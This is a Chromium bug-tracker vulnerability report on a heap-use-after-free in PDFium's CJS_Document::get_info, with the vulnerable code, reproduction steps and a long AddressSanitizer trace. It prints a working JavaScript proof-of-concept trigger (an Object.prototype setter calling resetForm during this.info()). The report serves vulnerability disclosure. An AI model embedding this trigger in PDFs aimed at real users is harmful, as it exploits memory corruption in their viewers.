# Security: Heap-use-after-free in CJS_Document::get_info

| Field | Value |
|-------|-------|
| **Issue ID** | [40092698](https://issues.chromium.org/issues/40092698) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2018-10-14 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**

This bug is present in CJS\_Document::get\_info method of cjs\_document.cpp.  

This method has below mentioned for loop.

//This for loop iterates a CPDF\_Dictionary object.  

//CPDF\_Dictionary object keeps a std::map object to manage its' data and  

//also provides and iterator for this std::map.  

for (const auto& it : \*pDictionary) {  

const ByteString& bsKey = it.first;  

CPDF\_Object\* pValueObj = it.second.get();  

WideString wsKey = WideString::FromUTF8(bsKey.AsStringView());  

if (pValueObj->IsString() || pValueObj->IsName()) {

```
  //Here this method tries to put a property to a Javascript object.  
  //It is possible to execute Javascript code, which will invalidate the iterator  
 //by defining a setter to Javascript Object.prototype.  
  pRuntime->PutObjectProperty(  
      pObj, wsKey,  
      pRuntime->NewString(pValueObj->GetUnicodeText().AsStringView()));  
.....  

```

}

## Contents of PDF file

This PDF file has a text field named 'txt1'.  

It also defines a information dictionary (To store Author, Creation Date etc).  

This PDF file uses same PDF object as dictionary for 'txt1' text field and information dictionary.  

So when CJS\_Document::get\_info method iterates through information dictionary, below Javascript code  

will delete object with key "V" from dictionary of text field. This will invalidate the iterator of for loop.

## Document Javascript Section

function run()  

{  

var doc = this;  

Object.prototype.**defineSetter**('V', function(){  

doc.resetForm();  

});  

info = this.info();  

}  

app.setTimeOut('run()',3000);

**VERSION**  

Chrome Version: [69.0.3497.100] + [stable]  

[72.0.3580.0] + [TOT build]  

Operating System: [Windows 10, Ubuntu 16.04]

**REPRODUCTION CASE**

1. Open Chrome
2. Navigate to pdf\_get\_info.pdf file.  
   
   PDF Plugin process will crash.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [PDF Plugin process]  

Crash State: [Address Sanitizer output]  

==1==ERROR: AddressSanitizer: heap-use-after-free on address 0x60400003d958 at pc 0x5603d63e8859 bp 0x7fffb18c67f0 sp 0x7fffb18c67e8  

READ of size 8 at 0x60400003d958 thread T0 (chrome)  

#0 0x5603d63e8858 in std::\_\_1::\_\_tree\_end\_node<std::\_\_1::\_\_tree\_node\_base<void\*>\*>\* std::\_\_1::\_\_tree\_next\_iter<std::\_\_1::\_\_tree\_end\_node<std::\_\_1::\_\_tree\_node\_base<void\*>\*>\*, std::\_\_1::\_\_tree\_node\_base<void\*>\*>(std::\_\_1::\_\_tree\_node\_base<void\*>\*) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:185:14  

#1 0x5603d63e8858 in std::\_\_1::\_\_tree\_const\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long>::operator++() /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:921:0  

#2 0x5603d63e8858 in std::\_\_1::\_\_map\_const\_iterator<std::\_\_1::\_\_tree\_const\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long> >::operator++() /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/map:772:0  

#3 0x5603d63e8858 in CJS\_Document::get\_info(CJS\_Runtime\*) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_document.cpp:744:0  

#4 0x5603d64184e8 in void JSPropGetter<CJS\_Document, &(CJS\_Document::get\_info(CJS\_Runtime\*))>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/js\_define.h:85:23  

#5 0x5603d63fe96c in CJS\_Document::get\_info\_static(v8::Local[v8::String](javascript:void(0);), v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_document.h:51:3  

#6 0x7fc103414a5d in v8::internal::PropertyCallbackArguments::BasicCallNamedGetterCallback(void (\*)(v8::Local[v8::Name](javascript:void(0);), v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) const&), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);)) /chromium/src/out/asan/../../v8/src/api-arguments-inl.h:196:3  

#7 0x7fc1034141bc in v8::internal::PropertyCallbackArguments::CallAccessorGetter(v8::internal::Handle[v8::internal::AccessorInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);)) /chromium/src/out/asan/../../v8/src/api-arguments-inl.h:328:10  

#8 0x7fc1036ef56a in v8::internal::Object::GetPropertyWithAccessor(v8::internal::LookupIterator\*) /chromium/src/out/asan/../../v8/src/objects.cc:1601:34  

#9 0x7fc1036ed144 in v8::internal::Object::GetProperty(v8::internal::LookupIterator\*, v8::internal::OnNonExistent) /chromium/src/out/asan/../../v8/src/objects.cc:1071:16  

#10 0x7fc1033ca91f in v8::internal::LoadIC::Load(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);)) /chromium/src/out/asan/../../v8/src/ic/ic.cc:469:5  

#11 0x7fc1033f1009 in v8::internal::\_\_RT\_impl\_Runtime\_LoadIC\_Miss(v8::internal::Arguments, v8::internal::Isolate\*) /chromium/src/out/asan/../../v8/src/ic/ic.cc:2174:5  

#12 0x7fc1033f03fa in v8::internal::Runtime\_LoadIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) /chromium/src/out/asan/../../v8/src/ic/ic.cc:2158:1  

#13 0x7fc10474b194 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_NoBuiltinExit embedded.cc:?  

#14 0x7fc10474b194 in ?? ??:0  

#15 0x7fc10481d1cc in Builtins\_LdaNamedPropertyHandler embedded.cc:?  

#16 0x7fc10481d1cc in ?? ??:0  

#12 0x7ee03d60ab8d (<unknown module>)  

#13 0x7ee03d60ab8d (<unknown module>)  

#17 0x7fc104493222 in Builtins\_JSEntryTrampoline embedded.cc:?  

#18 0x7fc104493222 in ?? ??:0  

#15 0x7ee03d6020dd (<unknown module>)  

#19 0x7fc1031003cd in v8::internal::GeneratedCode<v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, int, v8::internal::Object\*\*\*>::Call(v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, int, v8::internal::Object\*\*\*) /chromium/src/out/asan/../../v8/src/simulator.h:113:12  

#20 0x7fc1031003cd in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) /chromium/src/out/asan/../../v8/src/execution.cc:154:0  

#21 0x7fc1030fec0d in v8::internal::(anonymous namespace)::CallInternal(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) /chromium/src/out/asan/../../v8/src/execution.cc:190:10  

#22 0x7fc1030fe9e6 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) /chromium/src/out/asan/../../v8/src/execution.cc:201:10  

#23 0x7fc10222e1fe in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) /chromium/src/out/asan/../../v8/src/api.cc:2116:7  

#24 0x5603d6349bbc in CFXJS\_Engine::Execute(fxcrt::WideString const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cfxjs\_engine.cpp:540:25  

#25 0x5603d65e04a2 in CJS\_Runtime::ExecuteScript(fxcrt::WideString const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_runtime.cpp:176:10  

#26 0x5603d649624e in CJS\_EventContext::RunScript(fxcrt::WideString const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_event\_context.cpp:53:23  

#27 0x5603d637b7e7 in CJS\_App::RunJsScript(CJS\_Runtime\*, fxcrt::WideString const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_app.cpp:430:13  

#28 0x5603d637b511 in CJS\_App::TimerProc(GlobalTimer\*) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_app.cpp:417:5  

...

0x60400003d958 is located 8 bytes inside of 48-byte region [0x60400003d950,0x60400003d980)  

freed by thread T0 (chrome) here:  

#0 0x5603ce6b12e2 in operator delete(void\*) *asan\_rtl*:3  

#1 0x5603d586f1e3 in std::\_\_1::\_\_libcpp\_deallocate(void\*, unsigned long) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/new:279:10  

#2 0x5603d586f1e3 in std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> >::deallocate(std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, unsigned long) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1802:0  

#3 0x5603d586f1e3 in std::\_\_1::allocator\_traits<std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> > >::deallocate(std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> >&, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, unsigned long) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1556:0  

#4 0x5603d586f1e3 in std::\_\_1::\_\_tree<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_1::allocator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::erase(std::\_\_1::\_\_tree\_const\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long>) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:2370:0  

#5 0x5603d5866751 in std::\_\_1::map<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), std::\_\_1::allocator<std::\_\_1::pair<fxcrt::ByteString const, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::erase(std::\_\_1::\_\_map\_iterator<std::\_\_1::\_\_tree\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long> >) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1194:56  

#6 0x5603d5866751 in CPDF\_Dictionary::RemoveFor(fxcrt::ByteString const&) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:226:0  

#7 0x5603d5a72e52 in CPDF\_FormField::ResetField(NotificationOption) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_formfield.cpp:242:18  

#8 0x5603d5a87bc3 in CPDF\_InteractiveForm::ResetForm(NotificationOption) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_interactiveform.cpp:823:13  

#9 0x5603d63e185d in CJS\_Document::resetForm(CJS\_Runtime\*, std::\_\_1::vector<v8::Local[v8::Value](javascript:void(0);), std::\_\_1::allocator<v8::Local[v8::Value](javascript:void(0);) > > const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_document.cpp:577:15  

#10 0x5603d645e6fd in void JSMethod<CJS\_Document, &(CJS\_Document::resetForm(CJS\_Runtime\*, std::\_\_1::vector<v8::Local[v8::Value](javascript:void(0);), std::\_\_1::allocator<v8::Local[v8::Value](javascript:void(0);) > > const&))>(char const\*, char const\*, v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/js\_define.h:135:23  

#11 0x5603d64045a2 in CJS\_Document::resetForm\_static(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_document.h:108:3  

#12 0x7fc10249ec50 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) /chromium/src/out/asan/../../v8/src/api-arguments-inl.h:140:3  

#13 0x7fc10249b262 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) /chromium/src/out/asan/../../v8/src/builtins/builtins-api.cc:109:36  

#14 0x7fc102497870 in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) /chromium/src/out/asan/../../v8/src/builtins/builtins-api.cc:139:5  

#15 0x7fc102496a16 in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) /chromium/src/out/asan/../../v8/src/builtins/builtins-api.cc:127:1  

#16 0x7fc10474b194 in Builtins\_CEntry\_Return1\_DontSaveFPRegs\_ArgvOnStack\_NoBuiltinExit embedded.cc:?  

#17 0x7fc10474b194 in ?? ??:0  

#13 0x7ee03d60ab8d (<unknown module>)  

#18 0x7fc104489965 in Builtins\_ArgumentsAdaptorTrampoline embedded.cc:?  

#19 0x7fc104489965 in ?? ??:0  

#20 0x7fc104493222 in Builtins\_JSEntryTrampoline embedded.cc:?  

#21 0x7fc104493222 in ?? ??:0  

#16 0x7ee03d6020dd (<unknown module>)  

#22 0x7fc1031003cd in v8::internal::GeneratedCode<v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, int, v8::internal::Object\*\*\*>::Call(v8::internal::Object\*, v8::internal::Object\*, v8::internal::Object\*, int, v8::internal::Object\*\*\*) /chromium/src/out/asan/../../v8/src/simulator.h:113:12  

#23 0x7fc1031003cd in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) /chromium/src/out/asan/../../v8/src/execution.cc:154:0  

#24 0x7fc1030fec0d in v8::internal::(anonymous namespace)::CallInternal(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) /chromium/src/out/asan/../../v8/src/execution.cc:190:10  

#25 0x7fc1030fe9e6 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) /chromium/src/out/asan/../../v8/src/execution.cc:201:10  

#26 0x7fc1036fbd53 in v8::internal::Object::SetPropertyWithDefinedSetter(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::JSReceiver](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::ShouldThrow) /chromium/src/out/asan/../../v8/src/objects.cc:1779:3  

#27 0x7fc1036fbd53 in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::ShouldThrow) /chromium/src/out/asan/../../v8/src/objects.cc:1739:0  

#28 0x7fc10373972d in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::StoreOrigin, bool\*) /chromium/src/out/asan/../../v8/src/objects.cc:5157:16  

#29 0x7fc103738cb4 in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::StoreOrigin) /chromium/src/out/asan/../../v8/src/objects.cc:5212:9  

#30 0x7fc103c59fa6 in v8::internal::Runtime::SetObjectProperty(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::StoreOrigin) /chromium/src/out/asan/../../v8/src/runtime/runtime-object.cc:368:3  

#31 0x7fc10226ba89 in v8::Object::Set(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);)) /chromium/src/out/asan/../../v8/src/api.cc:4025:7  

#32 0x5603d6337e14 in CFX\_V8::PutObjectProperty(v8::Local[v8::Object](javascript:void(0);), fxcrt::WideString const&, v8::Local[v8::Value](javascript:void(0);)) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cfx\_v8.cpp:52:9  

#33 0x5603d63e8137 in CJS\_Document::get\_info(CJS\_Runtime\*) /chromium/src/out/asan/../../third\_party/pdfium/fxjs/cjs\_document.cpp:749:17  

...

previously allocated by thread T0 (chrome) here:  

#0 0x5603ce6b06a2 in operator new(unsigned long) *asan\_rtl*:3  

#1 0x5603d5870366 in std::\_\_1::\_\_libcpp\_allocate(unsigned long, unsigned long) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/new:259:10  

#2 0x5603d5870366 in std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> >::allocate(unsigned long, void const\*) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1799:0  

#3 0x5603d5870366 in std::\_\_1::allocator\_traits<std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> > >::allocate(std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> >&, unsigned long) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/memory:1548:0  

#4 0x5603d5870366 in std::\_\_1::unique\_ptr<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>, std::\_\_1::\_\_tree\_node\_destructor<std::\_\_1::allocator<std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*> > > > std::\_\_1::\_\_tree<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_1::allocator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::\_\_construct\_node<std::\_\_1::piecewise\_construct\_t const&, std::\_\_1::tuple[fxcrt::ByteString&&](javascript:void(0);), std::\_\_1::tuple<> >(std::\_\_1::piecewise\_construct\_t const&, std::\_\_1::tuple[fxcrt::ByteString&&](javascript:void(0);)&&, std::\_\_1::tuple<>&&) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:2191:0  

#5 0x5603d586f92b in std::\_\_1::pair<std::\_\_1::\_\_tree\_iterator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_tree\_node<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, void\*>\*, long>, bool> std::\_\_1::\_\_tree<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::\_\_map\_value\_compare<fxcrt::ByteString, std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), true>, std::\_\_1::allocator<std::\_\_1::\_\_value\_type<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::\_\_emplace\_unique\_key\_args<fxcrt::ByteString, std::\_\_1::piecewise\_construct\_t const&, std::\_\_1::tuple[fxcrt::ByteString&&](javascript:void(0);), std::\_\_1::tuple<> >(fxcrt::ByteString const&, std::\_\_1::piecewise\_construct\_t const&, std::\_\_1::tuple[fxcrt::ByteString&&](javascript:void(0);)&&, std::\_\_1::tuple<>&&) /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/\_\_tree:2137:29  

#6 0x5603d5869b56 in std::\_\_1::map<fxcrt::ByteString, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >, std::\_\_1::less[fxcrt::ByteString](javascript:void(0);), std::\_\_1::allocator<std::\_\_1::pair<fxcrt::ByteString const, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> > > > >::operator /chromium/src/out/asan/../../buildtools/third\_party/libc++/trunk/include/map:1329:20  

#7 0x5603d58640cb in CPDF\_Dictionary::SetFor(fxcrt::ByteString const&, std::\_\_1::unique\_ptr<CPDF\_Object, std::\_\_1::default\_delete<CPDF\_Object> >) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_dictionary.cpp:206:3  

#8 0x5603d5962e19 in CPDF\_SyntaxParser::GetObjectBodyInternal(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:514:16  

#9 0x5603d59672bf in CPDF\_SyntaxParser::GetIndirectObject(CPDF\_IndirectObjectHolder\*, CPDF\_SyntaxParser::ParseType) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_syntax\_parser.cpp:556:7  

#10 0x5603d59111a9 in CPDF\_Parser::ParseIndirectObjectAt(long, unsigned int) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:921:28  

#11 0x5603d5913644 in CPDF\_Parser::ParseIndirectObject(unsigned int) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_parser.cpp:870:12  

#12 0x5603d5872b4e in CPDF\_Document::ParseIndirectObject(unsigned int) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_document.cpp:195:33  

#13 0x5603d58b11c8 in CPDF\_IndirectObjectHolder::GetOrParseIndirectObject(unsigned int) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_indirect\_object\_holder.cpp:50:42  

#14 0x5603d5937771 in CPDF\_Reference::GetDirect() /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_reference.cpp:93:35  

#15 0x5603d57d7ed3 in CPDF\_Array::GetDirectObjectAt(unsigned long) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_array.cpp:106:24  

#16 0x5603d57d86ac in CPDF\_Array::GetDictAt(unsigned long) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfapi/parser/cpdf\_array.cpp:140:20  

#17 0x5603d5a83f21 in CPDF\_InteractiveForm::CPDF\_InteractiveForm(CPDF\_Document\*) /chromium/src/out/asan/../../third\_party/pdfium/core/fpdfdoc/cpdf\_interactiveform.cpp:595:24  

#18 0x5603d61b1dee in ReportUnsupportedFeatures(CPDF\_Document\*) /chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/cpdfsdk\_helpers.cpp:242:32  

#19 0x5603e7cd7009 in (anonymous namespace)::LoadDocumentImpl(fxcrt::RetainPtr<IFX\_SeekableReadStream> const&, char const\*) /chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:156:3  

#20 0x5603e7cd7a0e in FPDF\_LoadCustomDocument /chromium/src/out/asan/../../third\_party/pdfium/fpdfsdk/fpdf\_view.cpp:282:10  

#21 0x5603e7bdbfc9 in chrome\_pdf::PDFiumDocument::LoadDocument(char const\*) /chromium/src/out/asan/../../pdf/pdfium/pdfium\_document.cc:100:23  

#22 0x5603e7b9bfea in chrome\_pdf::PDFiumEngine::TryLoadingDoc(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, bool\*) /chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2615:14  

#23 0x5603e7b63625 in chrome\_pdf::PDFiumEngine::LoadDocument() /chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:2588:7  

#24 0x5603e7b65406 in chrome\_pdf::PDFiumEngine::OnDocumentComplete() /chromium/src/out/asan/../../pdf/pdfium/pdfium\_engine.cc:960:3  

#25 0x5603e7be5ecc in chrome\_pdf::DocumentLoaderImpl::ReadComplete() /chromium/src/out/asan/../../pdf/document\_loader\_impl.cc:407:14  

#26 0x5603e7be63d7 in chrome\_pdf::DocumentLoaderImpl::DidRead(int) /chromium/src/out/asan/../../pdf/document\_loader\_impl.cc:319:14  

...

**CREDIT INFORMATION**  

Reporter credit: [Anonymous]

## Attachments

- [pdf_get_info.pdf](attachments/pdf_get_info.pdf) (application/pdf, 1.1 KB)

## Timeline

### ch...@gmail.com (2018-10-14)

I missed a step in Reproduction Steps.

REPRODUCTION CASE
1. Open Chrome
2. Navigate to pdf_get_info.pdf file.
3. Wait for 3 seconds.
   PDF Plugin process will crash.

